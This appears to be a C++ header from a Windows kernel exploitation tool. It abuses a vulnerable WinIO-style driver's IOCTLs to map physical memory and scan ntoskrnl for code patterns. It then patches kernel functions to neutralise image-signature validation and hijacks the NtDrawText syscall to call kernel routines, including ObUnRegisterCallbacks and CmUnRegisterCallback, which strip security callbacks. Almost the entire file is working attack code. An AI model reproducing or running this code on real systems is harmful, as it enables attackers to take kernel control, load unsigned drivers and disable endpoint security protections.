#pragma once
#define IOCTL_WINIO_MAPPHYSTOLIN 0x80102040
#define IOCTL_WINIO_UNMAPPHYSADDR 0x80102044
#define IOCTL_WINIO_FREEALLOCPHYS 0x8010205C
#define IOCTL_WINIO_ALLOCPHYS 0x80102058
#define SYSCALL_JUMP_HOOK_SIZE 15
#define SYSCALL_JUMP_HOOK1_SIZE 19

#define u64 ULONG64

ULONG64 NTOSKRNL_PHYSICAL_MEMORY = 0;
ULONG64 NTOSKRNL_KERNEL_MEMORY = 0;
ULONG64 SeValidateImageData;
ULONG64 SeValidateImageHeader;
ULONG64 R0_ALLOC_ADDR = 0;
ULONG64 NtDrawText = 0;
ULONG64 MmGetPhysicalAddress = 0;
HANDLE hDeviceHandle = 0;
int SyscallNumber = 0;
int index = 0;


namespace PEFile {
    PIMAGE_NT_HEADERS ReadNTHeader(PVOID Address) {
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Address;
        PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((BYTE*)Address + DosHeader->e_lfanew);
        return NtHeader;
    }

    ULONG64 GetNTOSFuncAddress(char* FuncName) {

        HMODULE ntos = LoadLibraryA("ntoskrnl.exe");
        ULONG64 PocAddress = (ULONG64)GetProcAddress(ntos, FuncName);
        ULONG64 Offset = PocAddress - (ULONG64)ntos;
        std::cout << "[+]Find " << FuncName << " in " << std::hex << Offset << std::endl;
        return Offset;
    }
}



const int syscall_for_windows_version[] = {
    // Windows 10
    205, // 1507
    206, // 1511
    208, // 1607
    211, // 1703
    212, // 1709
    213, // 1803
    214, // 1809
    215, // 1903
    215, // 1909
    220, // 2004
    220, // 20H2
    220, // 21H1
    221, // 21H2
    221, // 22H2

    // Windows 11
    225, // Server 2022 (相近于 Win11)
    226, // 11 21H2
    227, // 11 22H2
    227, // 11 23H2
    229, // 11 24H2
};

unsigned char NtDrawTextMagicPattern[] = {
    0x41, 0xB8, 0x53, 0x74, 0x72, 0x67,       // mov     r8d, 67727453h
    0x48, 0x8B, 0xD3,                         // mov     rdx, rbx
    0x48, 0x8B, 0xD3,                         // mov     rdx, rbx
    0xB9, 0x00, 0x02, 0x00, 0x00,             // mov     ecx, 200h
    0xE8, 0x00, 0x00, 0x00, 0x00,             // call    ExAllocatePoolWithTag (address set to 0x00000000)
    0x48, 0x8B, 0xF0,                         // mov     rsi, rax
    0x48, 0x89, 0x44, 0x24, 0x60,             // mov     [rsp+48h+arg_10], rax
    0x48, 0x85, 0xC0,                         // test    rax, rax
    0x75, 0x07,                               // jnz     short loc_1405B34C2
    0xBB, 0x17, 0x00, 0x00, 0xC0,             // mov     ebx, 0C0000017h
    0xEB, 0x68                                // jmp     short loc_1405B352A
};

unsigned char NtDrawTextMagicPattern1[] = {
    0x48,0x89,0x5C,0x24,0x08
};


unsigned char MiniFilterMagic[] = {
    0x48, 0x8D, 0x1C, 0xC5, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8D, 0x2D, 0x00, 0x00, 0x00, 0x00
};


unsigned char SeValidateImageHeaderOriginal[4] = { 0 };
unsigned char SeValidateImageDataOriginal[4] = { 0 };


struct IOCTL_WINIO_MAPSTRUCT {
    ULONG64 size;
    ULONG64 Address;
    ULONG64 RTN_HANDLE;
    ULONG64 RTN_MAPADDR;
    ULONG64 RTN_SECTION;
};
typedef LARGE_INTEGER PHYSICAL_ADDRESS, * PPHYSICAL_ADDRESS;
EXTERN_C ULONG64 Syscall_NtDrawText(ULONG64,int);


namespace Driver {
    IOCTL_WINIO_MAPSTRUCT * MapPhysicalMemory(HANDLE hDeviceHandle, ULONG64 Size , ULONG64 PhysicalAddress) {
        IOCTL_WINIO_MAPSTRUCT map;
        map.Address = PhysicalAddress;
        map.size = Size;
        map.RTN_HANDLE = NULL;
        map.RTN_MAPADDR = NULL;
        map.RTN_SECTION = NULL;
        DeviceIoControl(hDeviceHandle, IOCTL_WINIO_MAPPHYSTOLIN, &map, sizeof(IOCTL_WINIO_MAPSTRUCT), &map, sizeof(IOCTL_WINIO_MAPSTRUCT), NULL, NULL);
        return &map;
    }
    ULONG64 UnMapPhysicalMemory(HANDLE hDeviceHandle, IOCTL_WINIO_MAPSTRUCT* STRUCT) {
        DeviceIoControl(hDeviceHandle, IOCTL_WINIO_UNMAPPHYSADDR, STRUCT, sizeof(IOCTL_WINIO_MAPSTRUCT), NULL, NULL, NULL, NULL);
        return true;
    }
}

namespace Memory {
    BOOL FindMZ(PVOID pMemory) {
        char* CPY_ADDR = (char*)malloc(2);
        memcpy(CPY_ADDR, pMemory, 2);
        if (CPY_ADDR[0] == 'M' && CPY_ADDR[1] == 'Z') {
            free(CPY_ADDR);
            return true;
        }
        free(CPY_ADDR);

        return FALSE;
    }
    void* find_pattern(
        const void* memory_start,
        size_t memory_size,
        const unsigned char* pattern,
        size_t pattern_size)
    {
        if (!memory_start || !pattern || pattern_size == 0 || memory_size < pattern_size) {
            return NULL;
        }

        const unsigned char* start = (const unsigned char*)memory_start;
        const unsigned char* end = start + memory_size - pattern_size;

        for (const unsigned char* p = start; p <= end; p++) {
            int match = 1;
            for (size_t i = 0; i < pattern_size; i++) {
                if (pattern[i] != 0x00 && pattern[i] != p[i]) {
                    match = 0;
                    break;
                }
            }
            if (match) {
                return (void*)p;
            }
        }

        return NULL;
    }



    bool xor_hook(ULONG64 WriteAddress, char* SaveOriginalBytes) {
        char payload[4] = { 0x48,0x33,0xc0,0xc3 }; // xor rax,rax ; ret ;
        memcpy(SaveOriginalBytes,(void*)WriteAddress, 4);
        memcpy((void*)WriteAddress, &payload, 4);
        return true;
    }

    bool syscall_jump_hook(ULONG64 WriteAddress, ULONG64 JumpAddress, char* SaveOriginalBytes) {
        char payload[] = {
            0x48, 0x8B, 0xCA,           // mov rcx, rdx
            0xE9, 0x00, 0x00, 0x00, 0x00, // jmp offset
            0xC3                        // ret
        };

        DWORD offset = (DWORD)(JumpAddress - (WriteAddress + 8)); // 正确偏移
        memcpy(SaveOriginalBytes, (void*)WriteAddress, sizeof(payload));
        memcpy(&payload[4], &offset, sizeof(offset)); // jmp 的 offset 在 payload[4]
        memcpy((void*)WriteAddress, payload, sizeof(payload));

        return true;
    }

    bool syscall_jump_set_rdx_max_hook(ULONG64 WriteAddress, ULONG64 JumpAddress, char* SaveOriginalBytes) {
        char payload[] = {
            0x48, 0x8B, 0xCA,           // mov rcx, rdx
            0x48, 0x31, 0xD2,           // xor rdx, rdx
            0x48, 0x83, 0xEA, 0x01,     // sub rdx, 1
            0xE9, 0x00, 0x00, 0x00, 0x00, // jmp offset
            0xC3                        // ret
        };

        DWORD offset = (DWORD)(JumpAddress - (WriteAddress + 15)); // 正确偏移
        memcpy(SaveOriginalBytes, (void*)WriteAddress, sizeof(payload));
        memcpy(&payload[11], &offset, sizeof(offset)); // jmp 的 offset 在 payload[11]
        memcpy((void*)WriteAddress, payload, sizeof(payload));

        return true;
    }

    bool unhook(ULONG64 WriteAddress, char* SaveOriginalBytes ,short size) {
        memcpy((void*)WriteAddress, SaveOriginalBytes, size);
        return true;
    }

    ULONG64 FindFunction(HANDLE hDeviceHandle, char* Pattern, char* FunctionName) {
        
        for (ULONG64 i = NTOSKRNL_PHYSICAL_MEMORY; i < NTOSKRNL_PHYSICAL_MEMORY + 0x2000000; i += 0x100000) {

            IOCTL_WINIO_MAPSTRUCT* map = { 0 };
            map = Driver::MapPhysicalMemory(hDeviceHandle,0x100000,i);
            //std::cout << "[+]Map Virtual Address:" << std::hex << i << std::endl;
            ULONG64 FunctionAddress = (ULONG64)Memory::find_pattern((const void*)map->RTN_MAPADDR, map->size, (const unsigned char*)Pattern, sizeof(Pattern));
            if (FunctionAddress) {
                std::cout << "[+]find " << FunctionName << " in " << std::hex << FunctionAddress - map->RTN_MAPADDR + map->Address - NTOSKRNL_PHYSICAL_MEMORY << std::endl;
                Driver::UnMapPhysicalMemory(hDeviceHandle, map);
                return FunctionAddress - map->RTN_MAPADDR + map->Address - NTOSKRNL_PHYSICAL_MEMORY;
            }
            Driver::UnMapPhysicalMemory(hDeviceHandle, map);
        }
        std::cout << "[-] could not found the function" << std::endl;
        
        return 0;
    }

    ULONG64 FindVulnFunction(HANDLE hDeviceHandle, char* Pattern, char* FunctionName) {

        for (ULONG64 i = NTOSKRNL_PHYSICAL_MEMORY; i < NTOSKRNL_PHYSICAL_MEMORY + 0x2000000; i += 0x100000) {

            IOCTL_WINIO_MAPSTRUCT* map = { 0 };
            map = Driver::MapPhysicalMemory(hDeviceHandle, 0x100000, i);
            //std::cout << "[+]Map Virtual Address:" << std::hex << i << std::endl;
            ULONG64 FunctionAddress = (ULONG64)Memory::find_pattern((const void*)map->RTN_MAPADDR, map->size, (const unsigned char*)Pattern, sizeof(Pattern));
            if (FunctionAddress) {
                
                ULONG64 FunctionHeadAddress = (ULONG64)Memory::find_pattern((const void*)(FunctionAddress-0x100), 0x100, (const unsigned char*)NtDrawTextMagicPattern1, sizeof((const char *)NtDrawTextMagicPattern1));
                Driver::UnMapPhysicalMemory(hDeviceHandle, map);
                ULONG64 offset = FunctionAddress - FunctionHeadAddress;
                std::cout << "[+]find " << FunctionName << " in " << std::hex << FunctionAddress - map->RTN_MAPADDR + map->Address - NTOSKRNL_PHYSICAL_MEMORY - offset  << std::endl;
                
                return FunctionAddress - map->RTN_MAPADDR + map->Address - NTOSKRNL_PHYSICAL_MEMORY - offset;
            }
            Driver::UnMapPhysicalMemory(hDeviceHandle, map);
        }
        std::cout << "[-] could not found the function" << std::endl;

        return 0;
    }

}

namespace Syscall {
 


    ULONG64 GetPhysicalMemoryAddress(ULONG64 VirtualMemoryAddress , ULONG64 VulnFuncAddressOffset , ULONG64 MmGetPhysicalMemoryFuncAddressOffset, ULONG64 NTOSKRNL_MAP_ADDRESS) {
        ULONG64 VulnFuncAddr = NTOSKRNL_MAP_ADDRESS + VulnFuncAddressOffset;
        ULONG64 PhysicalMemFuncAddr = NTOSKRNL_MAP_ADDRESS + MmGetPhysicalMemoryFuncAddressOffset;
        char SyscallJumpOriginalBytes[SYSCALL_JUMP_HOOK_SIZE] = { 0 };
        Memory::syscall_jump_hook(VulnFuncAddr, PhysicalMemFuncAddr, SyscallJumpOriginalBytes);
        //std::cout << "[+]Syscall Hook GetPhysicalMemoryAddress Success " << std::endl;
        ULONG64 PhysicalAddress = Syscall_NtDrawText(VirtualMemoryAddress,SyscallNumber);
        std::cout << "[+]MmGetPhysicalAddress : " << std::hex << PhysicalAddress << std::endl;
        Memory::unhook(VulnFuncAddr, SyscallJumpOriginalBytes, SYSCALL_JUMP_HOOK_SIZE);
        //std::cout << "[+]Syscall UnHook GetPhysicalMemoryAddress Success " << std::endl;
        return PhysicalAddress;

    }

    ULONG64 MmAllocateContiguousMemory(ULONG64 size, ULONG64 VulnFuncAddressOffset, ULONG64 MMmAllocateContiguousMemoryOffset, ULONG64 NTOSKRNL_MAP_ADDRESS) {
        ULONG64 VulnFuncAddr = NTOSKRNL_MAP_ADDRESS + VulnFuncAddressOffset;
        ULONG64 MMmAllocateContiguousMemoryAddr = NTOSKRNL_MAP_ADDRESS + MMmAllocateContiguousMemoryOffset;
        char SyscallJumpOriginalBytes[SYSCALL_JUMP_HOOK1_SIZE] = { 0 };
        Memory::syscall_jump_set_rdx_max_hook(VulnFuncAddr, MMmAllocateContiguousMemoryAddr, SyscallJumpOriginalBytes);
        std::cout << "[+]Syscall Hook MMmAllocateContiguousMemory Success " << std::endl;
        ULONG64 KernelAddress = Syscall_NtDrawText(size, SyscallNumber);
        std::cout << "[+]MMmAllocateContiguousMemory : " << std::hex << KernelAddress << std::endl;
        Memory::unhook(VulnFuncAddr, SyscallJumpOriginalBytes, SYSCALL_JUMP_HOOK_SIZE);
        std::cout << "[+]Syscall UnHook MMmAllocateContiguousMemory Success " << std::endl;
        return KernelAddress;

    }

    ULONG64 ObUnRegisterCallbacks(ULONG64 ObUnRegisterCallbacksAddress, ULONG64 VulnFuncAddressOffset, ULONG64 NTOSKRNL_MAP_ADDRESS) {
        ULONG64 VulnFuncAddr = NTOSKRNL_MAP_ADDRESS + VulnFuncAddressOffset;
        u64 ObUnRegisterCallbacksFunc = PEFile::GetNTOSFuncAddress((char*)"ObUnRegisterCallbacks");
        if (!ObUnRegisterCallbacksFunc)return false;
        ULONG64 ObUnRegisterCallbacksAddr = NTOSKRNL_MAP_ADDRESS + ObUnRegisterCallbacksFunc;
        char SyscallJumpOriginalBytes[SYSCALL_JUMP_HOOK_SIZE] = { 0 };
        Memory::syscall_jump_hook(VulnFuncAddr, ObUnRegisterCallbacksAddr, SyscallJumpOriginalBytes);
        //std::cout << "[+]Syscall Hook GetPhysicalMemoryAddress Success " << std::endl;
        ULONG64 status = Syscall_NtDrawText(ObUnRegisterCallbacksAddress, SyscallNumber);
        std::cout << "[+]ObUnRegisterCallbacksAddress : " << std::hex << status << std::endl;
        Memory::unhook(VulnFuncAddr, SyscallJumpOriginalBytes, SYSCALL_JUMP_HOOK_SIZE);
        //std::cout << "[+]Syscall UnHook GetPhysicalMemoryAddress Success " << std::endl;
        return status;

    }

    ULONG64 CmunRegisterCallback(ULONG64 Cookies, ULONG64 VulnFuncAddressOffset, ULONG64 NTOSKRNL_MAP_ADDRESS) {
        ULONG64 VulnFuncAddr = NTOSKRNL_MAP_ADDRESS + VulnFuncAddressOffset;
        u64 CmunRegisterCallbackFunc = PEFile::GetNTOSFuncAddress((char*)"CmUnRegisterCallback");
        if (!CmunRegisterCallbackFunc)return false;
        ULONG64 CmunRegisterCallbackAddr = NTOSKRNL_MAP_ADDRESS + CmunRegisterCallbackFunc;
        char SyscallJumpOriginalBytes[SYSCALL_JUMP_HOOK_SIZE] = { 0 };
        Memory::syscall_jump_hook(VulnFuncAddr, CmunRegisterCallbackAddr, SyscallJumpOriginalBytes);
        //std::cout << "[+]Syscall Hook GetPhysicalMemoryAddress Success " << std::endl;
        ULONG64 status = Syscall_NtDrawText(Cookies, SyscallNumber);
        std::cout << "[+]CmunRegisterCallback : " << std::hex << status << std::endl;
        Memory::unhook(VulnFuncAddr, SyscallJumpOriginalBytes, SYSCALL_JUMP_HOOK_SIZE);
        //std::cout << "[+]Syscall UnHook GetPhysicalMemoryAddress Success " << std::endl;
        return status;
        

    }
}

u64 dwMajor = 0;

// 将 DisplayVersion 映射为 syscall 数组索引
int MapDisplayVersionToIndex(const char* displayVersion, const char* productName) {
    if (strstr(productName, "Windows 10") != NULL) {
        dwMajor = 10;
        if (strcmp(displayVersion, "1507") == 0) return 0;
        if (strcmp(displayVersion, "1511") == 0) return 1;
        if (strcmp(displayVersion, "1607") == 0) return 2;
        if (strcmp(displayVersion, "1703") == 0) return 3;
        if (strcmp(displayVersion, "1709") == 0) return 4;
        if (strcmp(displayVersion, "1803") == 0) return 5;
        if (strcmp(displayVersion, "1809") == 0) return 6;
        if (strcmp(displayVersion, "1903") == 0) return 7;
        if (strcmp(displayVersion, "1909") == 0) return 8;
        if (strcmp(displayVersion, "2004") == 0) return 9;
        if (strcmp(displayVersion, "20H2") == 0 || strcmp(displayVersion, "21H1") == 0) return 10;
        if (strcmp(displayVersion, "21H2") == 0) return 12;
        if (strcmp(displayVersion, "22H2") == 0) return 13;
    }

    else if (strstr(productName, "Windows 11") != NULL) {
        dwMajor = 11;
        if (strcmp(displayVersion, "21H2") == 0) return 14; // Server 2022 / Win11 21H2
        if (strcmp(displayVersion, "22H2") == 0) return 15;
        if (strcmp(displayVersion, "23H2") == 0) return 16;
        if (strcmp(displayVersion, "24H2") == 0) return 18;
    }

    return -1; // 不支持的版本
}

// 获取 syscall 编号
int GetSyscallNumber() {
    HKEY hKey;
    char DisplayVersion[64];
    DWORD dwBufferSize = sizeof(DisplayVersion);
    char ProductName[64];
    DWORD dwProductNameSize = sizeof(ProductName);
    int syscall_num = -1;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        RegQueryValueExA(hKey, "DisplayVersion", NULL, NULL, (LPBYTE)DisplayVersion, &dwBufferSize);
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)ProductName, &dwProductNameSize);

        printf("DisplayVersion: %s\n", DisplayVersion);
        printf("ProductName: %s\n", ProductName);

        index = MapDisplayVersionToIndex(DisplayVersion, ProductName);

        switch (index) {
        case 0: case 1: case 2: case 3: case 4:
        case 5: case 6: case 7: case 8: case 9:
        case 10: case 12: case 13:
            syscall_num = syscall_for_windows_version[index];
            break;

        case 14: case 15: case 16: case 18:
            syscall_num = syscall_for_windows_version[index];
            break;

        default:
            break;
        }

        RegCloseKey(hKey);
    }
    else {
    }

    return syscall_num;
}

